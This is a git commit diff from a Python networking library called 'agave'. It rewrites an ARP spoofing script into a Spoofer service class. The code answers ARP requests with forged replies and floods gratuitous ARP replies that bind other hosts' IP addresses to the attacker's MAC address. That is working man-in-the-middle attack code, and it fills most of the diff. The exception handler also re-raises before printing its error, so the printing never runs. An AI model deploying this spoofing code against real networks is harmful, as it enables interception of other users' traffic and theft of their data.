b951dbae1ba6fe63811ecd2bde06c164cbea8ffb
Claudjos <claudjosmail@gmail.com>
2022-04-05 14:00:16 +0200

    Rewrote spoof to use Service

--- agave/arp/spoof.py
+++ agave/arp/spoof.py
@@ -6,32 +6,45 @@ Usage:
 
 """
 import socket, sys
-from agave.core.helpers import execute, flood, MessageRaw
+from agave.core.helpers import Service, SocketAddress
 from agave.core.arp import ARP, OPERATION_REQUEST
 from agave.core.ethernet import Ethernet, ETHER_TYPE_ARP, MACAddress
 from agave.nic.interfaces import NetworkInterface
-from .utils import create_filter, _parse
+from .utils import create_filter, _parse, _create_socket
 from .resolve import resolve_mac
 from ipaddress import IPv4Address, IPv4Network
-from typing import Callable
+from typing import Callable, Tuple
 
 
-def build_process(
-	sock: "socket.socket",
-	_filter: Callable[[ARP], bool],
-	mac: MACAddress,
-) -> Callable[[MessageRaw], str]:
-	"""
-	"""
-	def fn(message: MessageRaw):
-		_, arp = _parse(message[0])
-		if _filter(arp):
-			sock.sendto(
-				arp.reply(mac.address),
-				(message[1][0], message[1][1])
+class Spoofer(Service):
+
+	__slots__ = ("filter", "messages_to_flood")
+
+	def __init__(
+		self,
+		sock: "socket.socket",
+		request_filter: Callable[[ARP], bool],
+		messages_to_flood: Tuple[bytes, SocketAddress],
+		**kwargs
+	):
+		super().__init__(sock, **kwargs)
+		if messages_to_flood is None or messages_to_flood == []:
+			self.disable_loop()
+		self.filter = request_filter
+		self.messages_to_flood = messages_to_flood
+
+	def loop(self) -> bool:
+		for packet, address in self.messages_to_flood:
+			self.sock.sendto(packet, address)
+		return True
+
+	def process(self, data: bytes, address: SocketAddress) -> None:
+		_, arp = _parse(data)
+		if self.filter(arp):
+			self.sock.sendto(
+				arp.reply(self.mac.address),
+				(address[0], address[1])
 			)
-		return None
-	return fn
 
 
 if __name__ == "__main__":
@@ -50,15 +63,11 @@ if __name__ == "__main__":
 			else:
 				print("[INFO] Flood gratuitous is enabled.")
 				gratuitous = True
-		# ARP Spoofing
-		sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETHER_TYPE_ARP))
-		_filter = create_filter(OPERATION_REQUEST, sender=b, target=a)
-		process = build_process(sock, _filter, interface.mac)
-		repeat = lambda: True
 		# Builds gratuitous replies
+		sock = _create_socket()
+		messages = []
 		if gratuitous is True:
 			addr = (interface.name, ETHER_TYPE_ARP)
-			messages = []
 			for sender in a.hosts():
 				for target in b.hosts():
 					t_mac = resolve_mac(target, interface, sock=sock)
@@ -69,15 +78,22 @@ if __name__ == "__main__":
 						)
 					else:
 						messages.append((ARP.is_at(interface.mac.address, sender, t_mac.address, target), addr))
-			repeat = flood(sock, messages)
+		# Builds service		
+		service = Spoofer(
+			sock,
+			create_filter(OPERATION_REQUEST, sender=b, target=a),
+			messages,
+			interval=(1 if gratuitous else 3600),
+			wait=0
+		)
 		# Running
 		print("[INFO] Running...")
-		for i in execute(sock, process, repeat):
-			pass
+		service.run()
 
 	except KeyboardInterrupt:
 		pass
 	except BaseException as e:
+		raise e
 		print(__doc__)
 		print(f"[ERROR] {e}")
 
